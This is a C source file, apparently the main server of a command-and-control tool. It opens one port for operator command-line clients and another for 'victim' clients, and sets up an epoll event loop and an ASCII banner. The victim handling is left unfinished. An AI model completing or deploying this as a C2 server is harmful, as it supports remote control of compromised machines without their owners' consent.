#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <string.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <arpa/inet.h>

#include "server.h"

/* Global Vars */
struct commandServer server; /* Server global state  */

void asciiArt(void){
#include "asciilogo.h"

        char *buf = malloc(1024*16);

        snprintf(buf, 1024*16, ascii_logo, 
                KRED, 
                KNRM, KRED, 
                KNRM, KRED, server.cli_port,
                KNRM, KRED, 
                KNRM, KRED, (long) getpid(),
                KNRM
        );
  
        printf("%s", buf);

        free(buf);
}

/* ==== Server Configurations ====  */

int openTcpSocket(int port, int *fd, int *count){
        fd[*count] = initTcpServer(port);
        (*count)++; 
        netNonBlock(NULL, *fd);
        
        return 0;
}

void initServer(void){
        server.pid = getpid();
       
        server.cli_port = DEFAULT_CLI_PORT;
        server.clifd_count = 0;
        
        server.victim_port = DEFAULT_VICTIM_PORT;
        server.victimfd_count = 0;

        server.event_loop = createEpollEventLoop();

        /* Open Sockets */
        openTcpSocket(server.cli_port, server.clifd, &server.clifd_count);
        openTcpSocket(server.victim_port, server.victimfd, &server.victimfd_count);
       
        /* Initialize Server Commands */

        /* Handle Events  */
        // Create event_loop fd to handle connecting cli clients
        int j;
        for(j=0; j < server.clifd_count; j++) {
               if (createEpollEvent(server.event_loop, server.clifd[j], EVENT_READ) == EVENT_ERR)                  
                        perror("createEpollFileEvent");
        }
        // Create event_loop fd to handle connecting victim clients

}

/* ==== Welcome to the Main Event ====  */

int main(void){
  
        initServer();
        asciiArt();

        // Main Event Loop
        eventMain(server.event_loop, server.clifd[0]);
        
        return 0;
}
